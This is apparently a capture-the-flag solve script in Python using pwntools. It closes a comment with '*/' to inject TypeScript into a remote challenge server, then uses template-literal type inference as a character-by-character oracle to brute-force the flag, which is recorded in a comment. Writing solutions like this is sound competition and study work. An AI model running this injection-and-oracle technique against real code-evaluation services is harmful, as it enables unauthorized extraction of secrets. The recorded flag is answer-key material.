import pwn

FLAG_START = "bctf{"

# Extracted from the source code. We use it only to get the index where the flag
# starts
FLAG_STRING = ' ON 10/1/2023. THE FLAG IS "bctf{fake_flag}"'

FLAG_START_INDEX = FLAG_STRING.find(FLAG_START) + len(FLAG_START)

# Charset optimized for 1337
CHARSET = "_" + "4bcd3fghijklmn0pqr57uvwxyz" + "o12eas6t89" + "}"
pwn.log.info(f"Using charset '{CHARSET}'")


def try_char_at_index(ch: str, idx: int) -> bool:
    code_prefix = (
        b"*/type CurrentChar<T extends string> = T extends `"
        + b"${infer _1}" * idx
        + b"${infer Char}${infer Rest}` ? Char : never; type MyString = `"
    )

    code_suffix = f"""`;
    // @ts-ignore
    type CurrentCharacter = CurrentChar<MyString>;
    let a: CurrentCharacter = '{ch}';
    """.encode(
        "utf-8"
    )

    p = pwn.remote("chall.pwnoh.io", 13381)
    p.sendline(code_prefix)
    p.recvuntil(b"(end with blank line)\n")
    p.sendline(code_suffix)
    p.sendline(b"")
    response = p.recvall()

    return response is not None and b"Congrats" in response


flag = FLAG_START  # bctf{4ny1_w4n7_50m3_4ny_04c975da}
current_char_index = FLAG_START_INDEX

while True:
    for ch in CHARSET:
        pwn.log.info(
            f"Trying '{ch}' for index {current_char_index}. Current flag: {flag}"
        )
        if try_char_at_index(ch, current_char_index):
            flag += ch
            current_char_index += 1

            if ch != "}":
                break

            pwn.log.success(f"flag: {flag}")
            exit(0)
